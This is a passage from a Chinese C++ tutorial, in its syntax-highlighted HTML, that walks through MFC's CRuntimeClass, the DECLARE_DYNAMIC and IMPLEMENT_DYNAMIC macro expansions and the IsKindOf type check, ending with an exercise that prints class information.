函数</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">_AFXDLL</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tCRuntimeClass<span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>PASCAL<span class=\"token operator\">*</span> m_pfnGetBaseClass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">else</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tCRuntimeClass<span class=\"token operator\">*</span> m_pBaseClass<span class=\"token punctuation\">;</span>  \t<span class=\"token comment\">// 父类指针</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// Operations</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tCObject<span class=\"token operator\">*</span> <span class=\"token function\">CreateObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// 动态创建函数</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tBOOL <span class=\"token function\">IsDerivedFrom</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> CRuntimeClass<span class=\"token operator\">*</span> pBaseClass<span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span><span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// 判断函数，判断是否父类</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token comment\">// dynamic name lookup and creation</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token keyword\">static</span> CRuntimeClass<span class=\"token operator\">*</span> PASCAL <span class=\"token function\">FromName</span><span class=\"token punctuation\">(</span>LPCSTR lpszClassName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token keyword\">static</span> CRuntimeClass<span class=\"token operator\">*</span> PASCAL <span class=\"token function\">FromName</span><span class=\"token punctuation\">(</span>LPCWSTR lpszClassName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token keyword\">static</span> CObject<span class=\"token operator\">*</span> PASCAL <span class=\"token function\">CreateObject</span><span class=\"token punctuation\">(</span>LPCSTR lpszClassName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token keyword\">static</span> CObject<span class=\"token operator\">*</span> PASCAL <span class=\"token function\">CreateObject</span><span class=\"token punctuation\">(</span>LPCWSTR lpszClassName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">// Implementation</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token function\">Store</span><span class=\"token punctuation\">(</span>CArchive<span class=\"token operator\">&amp;</span> ar<span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token keyword\">static</span> CRuntimeClass<span class=\"token operator\">*</span> PASCAL <span class=\"token function\">Load</span><span class=\"token punctuation\">(</span>CArchive<span class=\"token operator\">&amp;</span> ar<span class=\"token punctuation\">,</span> UINT<span class=\"token operator\">*</span> pwSchemaNum<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token comment\">// CRuntimeClass objects linked together in simple list</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\tCRuntimeClass<span class=\"token operator\">*</span> m_pNextClass<span class=\"token punctuation\">;</span>        \t<span class=\"token comment\">// 指向下一个 CRuntimeClass 结构体指针</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token keyword\">const</span> AFX_CLASSINIT<span class=\"token operator\">*</span> m_pClassInit<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>接下来继续查看宏  <code>DECLARE_DYNAMIC</code></p>\n<h3 id=\"宏declare_dynamic\"><a class=\"anchor\" href=\"#宏declare_dynamic\">#</a> 宏 DECLARE_DYNAMIC</h3>\n<p>在 VS2019 中的宏定义为：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">DECLARE_DYNAMIC</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>class_name<span class=\"token punctuation\">)</span> </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token expression\"><span class=\"token keyword\">public</span><span class=\"token operator\">:</span> </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token expression\"><span class=\"token keyword\">static</span> <span class=\"token keyword\">const</span> CRuntimeClass <span class=\"token keyword\">class</span></span><span class=\"token punctuation\">##</span><span class=\"token expression\">class_name<span class=\"token punctuation\">;</span> </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token expression\"><span class=\"token keyword\">virtual</span> CRuntimeClass<span class=\"token operator\">*</span> <span class=\"token function\">GetRuntimeClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span><span class=\"token punctuation\">;</span> </span></span>\\</pre></td></tr></table></figure><p>所以  <code>DECLARE_DYNAMIC(CMyApp)</code>  便可转变为:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span><span class=\"token operator\">:</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">static</span> <span class=\"token keyword\">const</span> CRuntimeClass classCMyApp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">virtual</span> CRuntimeClass<span class=\"token operator\">*</span> <span class=\"token function\">GetRuntimeClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>可以发现这句宏的作用就是声明了一个  <code>public</code>  的  <code>CRuntimeClass</code>  类型的变量：  <code>class##class_name</code> ，并且声明了一个名叫  <code>GetRuntimeClass</code>  的虚函数。</p>\n<p>而声明了一个  <code>static</code>  类型的类的成员变量，<strong>就必须要在类的外面进行初始化</strong>，由此我们有额可以想到宏  <code>IMPLEMENT_DYNAMIC</code>  的含义。</p>\n<h3 id=\"宏implement_dynamic\"><a class=\"anchor\" href=\"#宏implement_dynamic\">#</a> 宏 IMPLEMENT_DYNAMIC</h3>\n<p>在 VS2019 中的宏定义为：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">IMPLEMENT_DYNAMIC</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>class_name<span class=\"token punctuation\">,</span> base_class_name<span class=\"token punctuation\">)</span> </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token expression\"><span class=\"token function\">IMPLEMENT_RUNTIMECLASS</span><span class=\"token punctuation\">(</span>class_name<span class=\"token punctuation\">,</span> base_class_name<span class=\"token punctuation\">,</span> <span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">IMPLEMENT_RUNTIMECLASS</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>class_name<span class=\"token punctuation\">,</span> base_class_name<span class=\"token punctuation\">,</span> wSchema<span class=\"token punctuation\">,</span> pfnNew<span class=\"token punctuation\">,</span> class_init<span class=\"token punctuation\">)</span> </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token expression\">AFX_COMDAT <span class=\"token keyword\">const</span> CRuntimeClass class_name<span class=\"token operator\">::</span><span class=\"token keyword\">class</span></span><span class=\"token punctuation\">##</span><span class=\"token expression\">class_name <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token expression\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">class</span><span class=\"token expression\">_name<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">class</span> <span class=\"token class-name\">class_name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> wSchema<span class=\"token punctuation\">,</span> pfnNew<span class=\"token punctuation\">,</span> </span></span></span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t\t<span class=\"token expression\"><span class=\"token function\">RUNTIME_CLASS</span><span class=\"token punctuation\">(</span>base_class_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> class_init <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span> </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token expression\">CRuntimeClass<span class=\"token operator\">*</span> class_name<span class=\"token operator\">::</span><span class=\"token function\">GetRuntimeClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span> </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token expression\"><span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">return</span> <span class=\"token function\">RUNTIME_CLASS</span><span class=\"token punctuation\">(</span>class_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></span></span></pre></td></tr></table></figure><p>里面又包含了另一个宏  <code>IMPLEMENT_RUNTIMECLASS</code></p>\n<p>所以  <code>IMPLEMENT_DYNAMIC(CMyApp, CWinApp);</code>  可以转换为：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">__declspec</span><span class=\"token punctuation\">(</span>selectany<span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span> CRuntimeClass CMyApp<span class=\"token operator\">::</span>classCMyApp <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token string\">\"CMyApp\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">class</span> <span class=\"token class-name\">CMyApp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>CRuntimeClass<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>CWinApp<span class=\"token operator\">::</span>classCWinApp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token constant\">NULL</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>CRuntimeClass<span class=\"token operator\">*</span> <span class=\"token class-name\">CMyApp</span><span class=\"token operator\">::</span><span class=\"token function\">GetRuntimeClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span> <span class=\"token comment\">// 最后的 const 表示对该成员无法更改</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>CRuntimeClass<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>CMyApp<span class=\"token operator\">::</span>classCMyApp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"分析-iskindof-函数\"><a class=\"anchor\" href=\"#分析-iskindof-函数\">#</a> 分析 IsKindOf 函数</h3>\n<p>在 VS 中跟进一下：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>BOOL <span class=\"token class-name\">CObject</span><span class=\"token operator\">::</span><span class=\"token function\">IsKindOf</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> CRuntimeClass<span class=\"token operator\">*</span> pClass<span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">ENSURE</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span> <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// it better be in valid memory, at least for CObject size</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span><span class=\"token function\">AfxIsValidAddress</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>CObject<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token comment\">// simple SI case</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tCRuntimeClass<span class=\"token operator\">*</span> pClassThis <span class=\"token operator\">=</span> <span class=\"token function\">GetRuntimeClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token function\">ENSURE</span><span class=\"token punctuation\">(</span>pClassThis<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">return</span> pClassThis<span class=\"token operator\">-></span><span class=\"token function\">IsDerivedFrom</span><span class=\"token punctuation\">(</span>pClass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>调用了当前类的  <code>GetRuntimeClass()</code>  函数，既返回当前类中的  <code>CRuntimeClass</code>  指针类型的成员，然后调用了其的  <code>IsDerivedFrom</code>  函数：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>BOOL <span class=\"token class-name\">CRuntimeClass</span><span class=\"token operator\">::</span><span class=\"token function\">IsDerivedFrom</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> CRuntimeClass<span class=\"token operator\">*</span> pBaseClass<span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">ENSURE</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span> <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span><span class=\"token function\">AfxIsValidAddress</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>CRuntimeClass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> FALSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token function\">ENSURE</span><span class=\"token punctuation\">(</span>pBaseClass <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span><span class=\"token function\">AfxIsValidAddress</span><span class=\"token punctuation\">(</span>pBaseClass<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>CRuntimeClass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> FALSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token comment\">// simple SI case</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">const</span> CRuntimeClass<span class=\"token operator\">*</span> pClassThis <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">_AFXDLL</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">else</span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>pClassThis <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pClassThis <span class=\"token operator\">==</span> pBaseClass<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> TRUE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">_AFXDLL</span></span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pClassThis<span class=\"token operator\">-></span>m_pfnGetBaseClass <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\tpClassThis <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>pClassThis<span class=\"token operator\">-></span>m_pfnGetBaseClass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">else</span></span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\tpClassThis <span class=\"token operator\">=</span> pClassThis<span class=\"token operator\">-></span>m_pBaseClass<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token keyword\">return</span> FALSE<span class=\"token punctuation\">;</span>       <span class=\"token comment\">// walked to the top, no match</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>取当前的  <code>CRuntimeClass</code>  ，因为它是 const 类型，所以也要加 const 关键字，然后进入一个循环，一直取当前类的  <code>CRuntimeClass</code>  类型的父类指针。</p>\n<h2 id=\"课后练习\"><a class=\"anchor\" href=\"#课后练习\">#</a> 课后练习</h2>\n<ol>\n<li>让我们的第二个类也支持 RTTI</li>\n<li>分别自写函数打印出它的父类的  <code>CRuntime</code>  信息</li>\n</ol>\n<p><img data-src=\"image009.png\" alt=\"\" /></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">PrintCRuntimeInfo</span><span class=\"token punctuation\">(</span>CRuntimeClass<span class=\"token operator\">*</span> pClass<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">char</span> chInput<span class=\"token punctuation\">[</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>pClass <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token function\">sprintf_s</span><span class=\"token punctuation\">(</span>chInput<span class=\"token punctuation\">,</span> <span class=\"token string\">\"--------------------------------------\\t\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token function\">OutputDebugStringA</span><span class=\"token punctuation\">(</span>chInput<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token function\">ZeroMemory</span><span class=\"token punctuation\">(</span>chInput<span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token function\">sprintf_s</span><span class=\"token punctuation\">(</span>chInput<span class=\"token punctuation\">,</span> <span class=\"token string\">\"m_lpszClassName:[%s]\\t\\n\"</span><span class=\"token punctuation\">,</span> pClass<span class=\"token operator\">-></span>m_lpszClassName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token function\">OutputDebugStringA</span><span class=\"token punctuation\">(</span>chInput<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token function\">ZeroMemory</span><span class=\"token punctuation\">(</span>chInput<span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token function\">sprintf_s</span><span class=\"token punctuation\">(</span>chInput<span class=\"token punctuation\">,</span> <span class=\"token string\">\"m_nObjectSize:[%d]\\t\\n\"</span><span class=\"token punctuation\">,</span> pClass<span class=\"token operator\">-></span>m_nObjectSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token function\">OutputDebugStringA</span><span class=\"token punctuation\">(</span>chInput<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token function\">ZeroMemory</span><span class=\"token punctuation\">(</span>chInput<span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token function\">sprintf_s</span><span class=\"token punctuation\">(</span>chInput<span class=\"token punctuation\">,</span> <span class=\"token string\">\"m_wSchema:[%#010X]\\t\\n\"</span><span class=\"token punctuation\">,</span> pClass<span class=\"token operator\">-></span>m_wSchema<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token function\">OutputDebugStringA</span><span class=\"token punctuation\">(</span>chInput<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t<span class=\"token function\">ZeroMemory</span><span class=\"token punctuation\">(</span>chInput<span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token function\">sprintf_s</span><span class=\"token punctuation\">(</span>chInput<span class=\"token punctuation\">,</span> <span class=\"token string\">\"m_pBaseClass:[%p]\\t\\n\"</span><span class=\"token punctuation\">,</span> pClass<span class=\"token operator\">-></span>m_pBaseClass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t<span class=\"token function\">OutputDebugStringA</span><span class=\"token punctuation\">(</span>chInput<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\tpClass <span class=\"token operator\">=</span> pClass<span class=\"token operator\">-></span>m_pBaseClass<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"image010.png\" alt=\"\" 